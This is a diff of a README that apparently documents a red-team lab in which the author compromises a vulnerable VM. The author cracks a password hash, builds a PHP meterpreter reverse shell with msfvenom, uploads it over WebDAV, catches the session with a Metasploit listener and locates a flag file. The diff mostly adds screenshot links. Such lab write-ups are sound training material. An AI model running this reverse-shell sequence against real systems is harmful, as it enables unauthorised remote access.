@@ -27,8 +27,14 @@ Acted as a red team to attack a vulnerable VM within my environment, ultimately 
 
 - Next step is to figure out the login to the file directory dav://192.168.1.105/webdav/ using the hashed password at the top of Ashtons note. Using the website https://crackstation.net/  
    - Cracking the hash we find the password is linux4u
+    ![ac297f568253612ff55d38fdf157547b](https://user-images.githubusercontent.com/61332852/137390969-4da74fb4-9592-4fd2-9844-2e22bc2a5865.png)
+
 - Getting the login information to the company directory we know can exploit getting into the company system since the server has an open port 80 by creating a reverse shell script. The command being msf venom -p php/meterpreter/reverse_tcp LHOST=192.168.1.90 LPORT=4444 -f raw > newshell.php
-- Once the reverse shell script is created we can now upload it to the shared directory to run it. 
+![b5607ffdbb52b0186be7de39a308e88a](https://user-images.githubusercontent.com/61332852/137391072-15001d7a-24ad-431d-9b67-cf39a58c789e.png)
+
+- Once the reverse shell script is created we can now upload it to the shared directory to run it.
+ ![4acac4ed99b11426e3e93855ce8a74f8](https://user-images.githubusercontent.com/61332852/137391146-79ec5c42-adaf-45bb-bfe1-25fd537ddadc.png)
+
 - Before we run it we will want to run Metasploit to listen to the reverse shell on our host machine to access it remotely.
 - The commands would be used in this order to begin the listening 
    - Msfconsole -q
@@ -43,8 +49,13 @@ Acted as a red team to attack a vulnerable VM within my environment, ultimately 
       - To see if all the settings we had set are correct
    - Run
       - To execute the listening process
+ 
+ ![bc35031f4a1536c75c80faa31941456e](https://user-images.githubusercontent.com/61332852/137391217-c0c8f352-de04-4f7c-b3fb-5722b93771b1.png)
+
 
 - Once this is completed we can now run the actual script through the shared directory dav://192.168.1.105/webdav which then after will then open up meterpreter on our host machine to show that we have now established connection 
+![8316e2c4870b99011bd9c617fa3932fe](https://user-images.githubusercontent.com/61332852/137391273-63d35e21-d842-41fb-b658-6eb79a68052e.png)
+
    - After having the session open we can run basic commands to grab any other additional information about the system we got access to like getuid. We can also open up a shell terminal if needed by using the command shell.
 - We can now run the command find -iname flag.txt to grab the flag we are looking for one the target machine.
 
